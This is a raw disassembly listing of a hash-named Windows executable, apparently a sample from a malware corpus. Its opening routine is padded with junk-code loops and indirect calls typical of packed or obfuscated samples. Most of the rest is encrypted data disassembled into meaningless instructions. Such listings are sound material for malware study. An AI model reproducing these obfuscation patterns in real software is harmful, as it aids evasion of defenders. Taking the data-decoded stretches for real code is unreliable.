
84718da3b1d0f1bffc1982e5c0567c1076b1a88efa22fa8019d90f44a4f58d36.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fe0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fe09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e21c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fdf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fdd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fdd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fdd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fdd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fdd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e627
  401090:	cmp    DWORD PTR ds:0x42fdd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fdd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fdd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e224,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e80b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e7fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e7fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e7fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e228
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e3cf
  401100:	cmp    DWORD PTR ds:0x42e7fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e7fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e7fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e7fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e7fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e21c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e21c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e21c,esi
  401145:	cmp    DWORD PTR ds:0x42e21c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e62b
  401160:	cmp    DWORD PTR ds:0x42e21c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e21c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e21c,esi
  40117c:	cmp    DWORD PTR ds:0x42e21c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e234,0x1a
  401193:	cmp    DWORD PTR ds:0x42e234,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e234,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fe7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e327
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e54b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e234
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e234,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e7fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fe05
  4011f8:	adc    esi,DWORD PTR ds:0x42fe09
  4011fe:	mov    DWORD PTR ds:0x42fe05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e803,0x17
  401216:	cmp    DWORD PTR ds:0x42e803,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e803,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e2c6
  401238:	push   0x42e27d
  40123d:	call   DWORD PTR ds:0x42e62f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e803
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e803,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fe7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fe7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fe7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e327
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e633
  4012a0:	mov    esi,DWORD PTR ds:0x42fe7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fe7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	call   0x7070:0x70ec14d7
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [esi]
  40130c:	loop   0x401310
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	icebp  
  4013a8:	dec    ebx
  4013a9:	xchg   ecx,eax
  4013aa:	div    DWORD PTR [ebx+0x4c]
  4013ad:	ja     0x401354
  4013af:	add    DWORD PTR [ebx-0x2e],eax
  4013b2:	test   eax,0x2b35705d
  4013b7:	call   DWORD PTR [edi+0x2de3baa9]
  4013bd:	aad    0x80
  4013bf:	retf   
  4013c0:	outs   dx,BYTE PTR ds:[esi]
  4013c1:	cli    
  4013c2:	cmp    al,0x6
  4013c4:	sub    BYTE PTR [esi+0x31],al
  4013c7:	mov    bh,0x8b
  4013c9:	sbb    al,0xb7
  4013cb:	cmp    bh,bl
  4013cd:	fs cmp dl,dl
  4013d0:	lock xchg esi,eax
  4013d2:	clc    
  4013d3:	inc    ebx
  4013d4:	xchg   DWORD PTR [ecx],edi
  4013d6:	repz inc edx
  4013d8:	cs pop ss
  4013da:	or     ch,0xa8
  4013dd:	rcl    DWORD PTR [ebx+0xcd6cda7],0x83
  4013e4:	int3   
  4013e5:	inc    eax
  4013e6:	dec    eax
  4013e7:	popf   
  4013e8:	jecxz  0x401379
  4013ea:	and    eax,esi
  4013ec:	inc    esi
  4013ed:	push   esi
  4013ee:	jmp    0xc624da53
  4013f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f4:	inc    esp
  4013f5:	mov    esi,0xba4dec07
  4013fa:	sub    al,0x7a
  4013fc:	loope  0x40146d
  4013fe:	dec    esi
  4013ff:	and    DWORD PTR [eax+ebp*4],esp
  401402:	mov    esp,0x5f104ba6
  401407:	inc    ecx
  401408:	ret    
  401409:	jno    0x40140a
  40140b:	retf   
  40140c:	pop    es
  40140d:	retf   
  40140e:	dec    esi
  40140f:	retf   0xd9d
  401412:	cs int3 
  401414:	and    BYTE PTR [edi],dh
  401416:	out    0x31,eax
  401418:	sbb    dh,BYTE PTR [esi]
  40141a:	jb     0x4013cb
  40141c:	test   eax,0x472239eb
  401421:	and    al,0x1d
  401423:	mov    ah,0x40
  401425:	mov    BYTE PTR [eax-0x65],cl
  401428:	push   edx
  401429:	sbb    DWORD PTR [eax-0x32],ebp
  40142c:	xor    BYTE PTR [eax+0x3fbd685],ch
  401432:	or     BYTE PTR [esi+0x33],bl
  401435:	ret    
  401436:	dec    BYTE PTR [ecx]
  401438:	ss out 0xee,al
  40143b:	xlat   BYTE PTR ds:[ebx]
  40143c:	enter  0x3c3f,0xcf
  401440:	adc    eax,0xac961061
  401445:	xor    eax,eax
  401447:	enter  0x9ef2,0x7f
  40144b:	dec    ebp
  40144c:	mov    ebx,0x28e78a3
  401451:	ins    DWORD PTR es:[edi],dx
  401452:	dec    ebx
  401453:	pop    ebx
  401454:	sar    DWORD PTR [ecx+0x2d],cl
  401457:	push   es
  401458:	shl    DWORD PTR [ebp+0x6],cl
  40145b:	in     eax,dx
  40145c:	push   esi
  40145d:	xchg   BYTE PTR [ebp-0x4541ec2d],cl
  401463:	stos   DWORD PTR es:[edi],eax
  401464:	cmp    ah,al
  401466:	pop    ebp
  401467:	out    dx,eax
  401468:	jmp    0xb0e5:0x48632cb6
  40146f:	lahf   
  401470:	sbb    esp,DWORD PTR [edx-0x37e77fbf]
  401476:	fist   DWORD PTR [ebx]
  401478:	dec    esi
  401479:	cli    
  40147a:	aaa    
  40147b:	xor    DWORD PTR [esi-0x2af2e786],ebp
  401481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401482:	jl     0x401471
  401484:	or     eax,0x24dbe2
  401489:	es push edi
  40148b:	push   es
  40148c:	jno    0x4014e1
  40148e:	outs   dx,DWORD PTR ds:[esi]
  40148f:	and    ebp,DWORD PTR [edx+ecx*4+0x400c74d3]
  401496:	es dec ecx
  401498:	outs   dx,DWORD PTR ds:[esi]
  401499:	aas    
  40149a:	bound  eax,QWORD PTR [ecx]
  40149c:	hlt    
  40149d:	in     eax,dx
  40149e:	push   0xffffff86
  4014a0:	pop    ss
  4014a1:	jo     0x4014ff
  4014a3:	cmp    DWORD PTR [ebx-0x7501bca2],0x46
  4014aa:	in     eax,dx
  4014ab:	xor    BYTE PTR [eax+ebx*8-0xf983b91],ch
  4014b2:	cmp    ah,BYTE PTR [edi-0x16b00a55]
  4014b8:	scas   eax,DWORD PTR es:[edi]
  4014b9:	push   0x819ab1b8
  4014be:	adc    al,0x2d
  4014c0:	jbe    0x40147f
  4014c2:	std    
  4014c3:	jle    0x401450
  4014c5:	mov    edi,DWORD PTR ds:0x663f1429
  4014cb:	lods   eax,DWORD PTR ds:[esi]
  4014cc:	icebp  
  4014cd:	fstp   QWORD PTR [eax-0x30ddc6a6]
  4014d3:	ss mov al,0x62
  4014d6:	loop   0x401468
  4014d8:	in     al,dx
  4014d9:	or     DWORD PTR [esi],ecx
  4014db:	arpl   WORD PTR [edi-0x6],cx
  4014de:	jle    0x4014eb
  4014e0:	push   edx
  4014e1:	adc    DWORD PTR [ebp+ebx*1-0x50],edi
  4014e5:	cs jo  0x401521
  4014e8:	lahf   
  4014e9:	outs   dx,DWORD PTR ds:[esi]
  4014ea:	fdiv   DWORD PTR [ebx-0x53c0cdcf]
  4014f0:	enter  0x9564,0x97
  4014f4:	dec    edi
  4014f5:	sub    al,0x5a
  4014f7:	jae    0x4014f7
  4014f9:	pop    edi
  4014fa:	and    al,0xd6
  4014fc:	pop    es
  4014fd:	dec    edx
  4014fe:	xchg   esp,eax
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x4dd1e013]
  401516:	icebp  
  401517:	ss jo  0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	shl    BYTE PTR ds:0x501f449e,1
  401526:	js     0x40155a
  401528:	out    dx,al
  401529:	dec    eax
  40152a:	adc    esp,DWORD PTR [edi-0x4bcfe491]
  401530:	pop    ecx
  401531:	aad    0x94
  401533:	or     bl,BYTE PTR [edi]
  401535:	aad    0xf7
  401537:	xchg   DWORD PTR [ebp+0x62],ecx
  40153a:	mov    bl,0x83
  40153c:	sub    BYTE PTR [ebx],bl
  40153e:	xor    DWORD PTR [ecx],ebp
  401540:	fmul   DWORD PTR [esi]
  401542:	rcl    dl,0xda
  401545:	pushf  
  401546:	mov    cl,0x2a
  401548:	shr    DWORD PTR [ebx-0x2e],1
  40154b:	ss or  al,0xf2
  40154e:	mul    BYTE PTR [esi+edx*2-0x69]
  401552:	mov    bh,0x2d
  401554:	aaa    
  401555:	adc    cl,ah
  401557:	data16 mul BYTE PTR [edi+0x47]
  40155b:	add    DWORD PTR [ebx],0x31
  40155e:	sbb    bl,bh
  401560:	jg     0x4015c7
  401562:	push   ss
  401563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401564:	mov    bh,0x13
  401566:	ds cli 
  401568:	jno    0x4015cf
  40156a:	cmp    DWORD PTR [esi-0x75d0e174],0xffffff8d
  401571:	out    dx,al
  401572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401573:	mov    esp,0xd530cd
  401578:	addr16 jbe 0x401580
  40157b:	push   edx
  40157c:	bound  eax,QWORD PTR [ebx+0x3cbc4e94]
  401582:	or     DWORD PTR [ecx+0x5d560731],edi
  401588:	into   
  401589:	lods   eax,DWORD PTR ds:[esi]
  40158a:	ja     0x401573
  40158c:	or     eax,0xd4c4de57
  401591:	xor    edx,0xd398959d
  401597:	push   ebx
  401598:	int3   
  401599:	dec    eax
  40159a:	pop    edi
  40159b:	fsubr  st,st(7)
  40159d:	xor    BYTE PTR [eax+ebx*1+0x4b1e5a53],al
  4015a4:	xchg   DWORD PTR [edx],esi
  4015a6:	ret    
  4015a7:	lock cli 
  4015a9:	sub    edi,DWORD PTR [eax-0x2cdeef6d]
  4015af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015b0:	mov    ebp,0x6686313c
  4015b5:	push   edx
  4015b6:	add    esi,esi
  4015b8:	jae    0x401551
  4015ba:	aas    
  4015bb:	pop    esi
  4015bc:	les    ebx,FWORD PTR [edx+0xb]
  4015bf:	aam    0xa3
  4015c1:	repnz add eax,0x504dabf9
  4015c7:	popa   
  4015c8:	xor    bl,BYTE PTR [eax+0x494600fd]
  4015ce:	mov    eax,ds:0xe406aee3
  4015d4:	jmp    0xf9a2:0x97b0a333
  4015db:	adc    edi,eax
  4015dd:	sti    
  4015de:	(bad)  
  4015df:	in     eax,dx
  4015e0:	sahf   
  4015e1:	inc    ebx
  4015e2:	jns    0x40157f
  4015e4:	add    eax,0xd404ec45
  4015e9:	shl    DWORD PTR [ebp-0x3a],1
  4015ec:	push   esi
  4015ed:	in     al,dx
  4015ee:	mov    dh,0xeb
  4015f0:	and    eax,0xc283e0c0
  4015f5:	pop    esp
  4015f6:	jmp    0xb93e7902
  4015fb:	mov    dh,0x3a
  4015fd:	add    bh,BYTE PTR [edx-0x1d6d4aa6]
  401603:	or     DWORD PTR [ecx-0x53b41726],ebx
  401609:	mov    cl,0x31
  40160b:	mov    DWORD PTR [edx-0x4f],ebx
  40160e:	mov    ebx,0x771013a
  401613:	test   DWORD PTR [edx+0x3acd8787],esp
  401619:	jmp    0x38f8:0x38c0870c
  401620:	xchg   esp,eax
  401621:	or     al,ch
  401623:	pop    ecx
  401624:	repnz int 0xe
  401627:	push   ds
  401628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401629:	dec    ecx
  40162a:	das    
  40162b:	jmp    0x1fef:0xc41805e1
  401632:	push   ss
  401633:	jne    0x40166e
  401635:	out    dx,eax
  401636:	cmp    al,0x9f
  401638:	cmc    
  401639:	inc    edx
  40163a:	cdq    
  40163b:	int    0x94
  40163d:	int3   
  40163e:	stos   DWORD PTR es:[edi],eax
  40163f:	mov    ecx,0xdb369d24
  401644:	mov    ds:0xae71c52,al
  401649:	ret    0xe2a2
  40164c:	in     al,dx
  40164d:	sbb    BYTE PTR [edx-0x54ab7ca2],al
  401653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401654:	sbb    eax,0xd61f65df
  401659:	adc    BYTE PTR [esi+0x2ab4e58f],ch
  40165f:	jnp    0x401696
  401661:	mov    BYTE PTR [ebp-0x10],dh
  401664:	sub    ah,0x0
  401667:	pop    edx
  401668:	adc    al,0x51
  40166a:	or     al,0x22
  40166c:	imul   ecx,DWORD PTR [ebx-0x7c7391ac],0xffffffb8
  401673:	xchg   bh,dl
  401675:	adc    BYTE PTR [ebx+0x1c],al
  401678:	arpl   WORD PTR [eax+0x15],bp
  40167b:	pop    ebx
  40167c:	psubsb mm2,QWORD PTR [ecx-0x21]
  401680:	fs aas 
  401682:	adc    eax,0x2debb8bc
  401687:	pop    esi
  401688:	je     0x4016fa
  40168a:	mov    esp,0xf3695b04
  40168f:	sbb    eax,0x62ef0e5
  401694:	xchg   ebp,eax
  401695:	jmp    0xc459cda9
  40169a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40169b:	or     BYTE PTR [eax],bl
  40169d:	pop    ds
  40169e:	jo     0x401674
  4016a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016a1:	fcomp  DWORD PTR [ebx]
  4016a3:	and    ch,al
  4016a5:	dec    eax
  4016a6:	push   edx
  4016a7:	call   0x7331:0xac8d3159
  4016ae:	push   esp
  4016af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016b0:	loopne 0x401666
  4016b2:	sbb    ebx,DWORD PTR [edx]
  4016b4:	inc    esp
  4016b5:	loop   0x4016cd
  4016b7:	mov    eax,0x3149388c
  4016bc:	test   DWORD PTR [ebp-0x2180aec0],ebx
  4016c2:	dec    ebp
  4016c3:	adc    edi,ebx
  4016c5:	sub    al,0xb6
  4016c7:	sbb    edx,DWORD PTR [edi-0x8]
  4016ca:	out    dx,eax
  4016cb:	push   edx
  4016cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016cd:	das    
  4016ce:	jp     0x401732
  4016d0:	sub    bl,BYTE PTR [esi-0x57]
  4016d3:	or     eax,0xdb6d3c04
  4016d8:	jns    0x401733
  4016da:	pusha  
  4016db:	xor    BYTE PTR [ebp-0x14],0x70
  4016df:	ins    BYTE PTR es:[edi],dx
  4016e0:	xor    al,0xae
  4016e2:	mov    ebx,0xd53967c8
  4016e7:	enter  0xa86e,0x7
  4016eb:	popa   
  4016ec:	aaa    
  4016ed:	aam    0xe
  4016ef:	mov    ch,dl
  4016f1:	sub    DWORD PTR [edi],0xffffff95
  4016f4:	nop
  4016f5:	mov    ds:0x6f7f9949,al
  4016fa:	dec    ecx
  4016fb:	or     edi,DWORD PTR [ebx-0x7faeaaa1]
  401701:	pop    edx
  401702:	bound  esi,QWORD PTR [ecx+0x66ca7611]
  401708:	and    ch,BYTE PTR [ecx+eax*4+0x13]
  40170c:	add    BYTE PTR [edx+0x6f],ah
  40170f:	mov    ds:0x6ae2e45b,eax
  401714:	add    ebx,DWORD PTR [eax]
  401716:	test   al,0x57
  401718:	adc    BYTE PTR [ecx],dl
  40171a:	mov    edi,DWORD PTR [eax-0x26ed07f9]
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	mov    cl,0xa7
  401742:	(bad)  
  401743:	fdiv   QWORD PTR [eax+0x7c]
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	int    0xc0
  40174e:	fistp  DWORD PTR [edi+0x21]
  401751:	sti    
  401752:	test   al,0xa8
  401754:	int    0xbe
  401756:	cmp    BYTE PTR [ebx+0x1cf4e0f3],ah
  40175c:	enter  0x572e,0x50
  401760:	inc    eax
  401761:	pusha  
  401762:	pop    ebp
  401763:	imul   eax,ecx,0xffffff9e
  401766:	sub    DWORD PTR [eax+edi*8-0x36c4c359],edx
  40176d:	stos   BYTE PTR es:[edi],al
  40176e:	push   cs
  40176f:	inc    ebp
  401770:	push   0xef1d3458
  401775:	xchg   edi,eax
  401776:	jae    0x401799
  401778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401779:	mov    ch,0xca
  40177b:	int3   
  40177c:	jb     0x4017e2
  40177e:	fimul  WORD PTR [ebx-0x61ac1750]
  401784:	jo     0x401776
  401786:	call   0xaa5:0x401669a0
  40178d:	adc    esi,DWORD PTR ds:[ebp-0x61]
  401791:	call   0x55e0:0x356b4526
  401798:	cmc    
  401799:	jmp    0x9b5eb5b9
  40179e:	xor    al,0xd4
  4017a0:	sub    al,BYTE PTR [ebp+0x15cda03c]
  4017a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017a7:	adc    ebx,edx
  4017a9:	add    eax,0x92a59ec9
  4017ae:	push   0xeb2cfed6
  4017b3:	scas   al,BYTE PTR es:[edi]
  4017b4:	push   0xf516b42b
  4017b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ba:	cmp    dl,BYTE PTR [eax]
  4017bc:	push   es
  4017bd:	aam    0x79
  4017bf:	and    eax,0xc22e436e
  4017c4:	fs xchg edi,eax
  4017c6:	adc    al,0x34
  4017c8:	ja     0x4017e0
  4017ca:	or     esp,DWORD PTR [ebx-0x2e]
  4017cd:	jbe    0x401806
  4017cf:	add    DWORD PTR [esi+0x49],esp
  4017d2:	shl    DWORD PTR [ecx+0x1b],cl
  4017d5:	fisub  WORD PTR [ebp+0x7f93aeb7]
  4017db:	retf   
  4017dc:	pop    edi
  4017dd:	sub    dh,BYTE PTR [esi+0x5e5e6453]
  4017e3:	clc    
  4017e4:	xor    eax,0x16d4d626
  4017e9:	inc    ecx
  4017ea:	dec    esi
  4017eb:	mov    edi,0x1fd09cfd
  4017f0:	or     al,dh
  4017f2:	xchg   ebp,eax
  4017f3:	pop    esi
  4017f4:	add    al,0xe9
  4017f6:	inc    eax
  4017f7:	mov    ebx,0xa06e1bd7
  4017fc:	xor    al,0x5d
  4017fe:	mov    bh,0xd
  401800:	iret   
  401801:	out    0x3a,al
  401803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401804:	js     0x40186c
  401806:	jbe    0x401825
  401808:	ret    0x3410
  40180b:	cdq    
  40180c:	xor    cl,cl
  40180e:	aad    0x16
  401810:	pop    ecx
  401811:	sub    al,0xc9
  401813:	mov    ah,0x26
  401815:	jecxz  0x401871
  401817:	mov    ds:0xd35081ab,eax
  40181c:	lock add BYTE PTR [ebp+ecx*2-0x1d],ah
  401821:	test   edx,esp
  401823:	jb     0x40188d
  401825:	out    dx,eax
  401826:	sbb    DWORD PTR [eax-0x55],0x2074dcb6
  40182d:	test   eax,0xa07b8d78
  401832:	push   edx
  401833:	fs aas 
  401835:	mov    ch,BYTE PTR [ecx+0x36]
  401838:	push   ds
  401839:	add    al,bh
  40183b:	hlt    
  40183c:	mov    eax,ds:0x645574f6
  401841:	sub    al,0x2f
  401843:	arpl   WORD PTR [ebp+edi*4+0x378a69bb],si
  40184a:	sti    
  40184b:	leave  
  40184c:	jae    0x401886
  40184e:	mov    ebp,es
  401850:	sbb    al,BYTE PTR [ebp-0x3cdcb404]
  401856:	das    
  401857:	nop
  401858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401859:	mov    bl,BYTE PTR [edi+0x4c7da581]
  40185f:	loop   0x401830
  401861:	jg     0x4017f6
  401863:	fcom   DWORD PTR [edi]
  401865:	cwde   
  401866:	dec    ebx
  401867:	mov    eax,0x42140daa
  40186c:	jnp    0x40186b
  40186e:	js     0x4017f6
  401870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401871:	jecxz  0x401896
  401873:	mov    bl,BYTE PTR [esi+0x49]
  401876:	dec    esi
  401877:	scas   al,BYTE PTR es:[edi]
  401878:	jge    0x401881
  40187a:	test   eax,0x4315e19
  40187f:	dec    ebx
  401880:	sub    al,0x13
  401882:	inc    ecx
  401883:	push   esp
  401884:	pusha  
  401885:	xchg   DWORD PTR [esi+0x770c3a56],ebx
  40188b:	jecxz  0x4018a4
  40188d:	fwait
  40188e:	aam    0xde
  401890:	xchg   ebp,eax
  401891:	xchg   edx,eax
  401892:	ins    BYTE PTR es:[edi],dx
  401893:	cmp    esi,0xfa9a1fa9
  401899:	sub    edx,DWORD PTR [edi]
  40189b:	div    edx
  40189d:	loopne 0x401899
  40189f:	jae    0x4018ca
  4018a1:	call   0x59bf:0x7969b060
  4018a8:	mov    ds:0xf3036883,eax
  4018ad:	fadd   QWORD PTR [ecx+0x38]
  4018b0:	imul   edi,DWORD PTR [eax],0x23521c0e
  4018b6:	adc    ebx,edx
  4018b8:	dec    esp
  4018b9:	and    edx,DWORD PTR [ecx+ebp*2]
  4018bc:	(bad)  
  4018bd:	out    dx,al
  4018be:	mov    ah,0x52
  4018c0:	xor    edx,DWORD PTR [edi-0xd]
  4018c3:	jge    0x40184d
  4018c5:	push   edx
  4018c6:	mov    BYTE PTR [esp+eiz*2-0x642bf504],bl
  4018cd:	test   BYTE PTR [ebp-0x8b026a6],bh
  4018d3:	ret    
  4018d4:	sbb    DWORD PTR [ebx],ebx
  4018d6:	popa   
  4018d7:	shl    DWORD PTR [esi+0x15],0x26
  4018db:	jo     0x4018ba
  4018dd:	lods   al,BYTE PTR ds:[esi]
  4018de:	bound  edi,QWORD PTR ds:0xdd7e9fcc
  4018e4:	xchg   esi,eax
  4018e5:	outs   dx,BYTE PTR ds:[esi]
  4018e6:	push   edx
  4018e7:	jbe    0x4018d3
  4018e9:	lods   eax,DWORD PTR ds:[esi]
  4018ea:	add    ebp,edx
  4018ec:	aad    0xdb
  4018ee:	push   esp
  4018ef:	or     ecx,eax
  4018f1:	fs out 0xf1,eax
  4018f4:	fist   WORD PTR [edi]
